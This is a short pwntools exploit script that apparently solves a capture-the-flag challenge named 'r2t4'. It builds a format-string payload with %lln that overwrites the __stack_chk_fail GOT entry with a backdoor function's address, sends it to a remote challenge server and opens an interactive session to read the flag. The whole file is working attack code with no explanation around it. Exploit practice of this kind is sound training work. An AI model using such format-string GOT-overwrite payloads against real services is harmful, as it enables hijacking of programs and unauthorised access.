from pwn import *
context.arch='amd64'
# rewrite the stack_chk_fail@got to backdoor and read flag by format string vulnerability

# p = process('./r2t4')
p = remote('node3.buuoj.cn',27411)
elf = ELF('./r2t4',checksec=False)

# check = elf.sym['___stack_chk_fail']
backdoor = elf.sym['backdoor']
log.info('backdoor=%#x',backdoor)
payload = "a%" + str(backdoor-1) + "c%8$lln" + p64(0x0000000000601018) + 'A'*0x20

p.send(payload)
p.interactive()
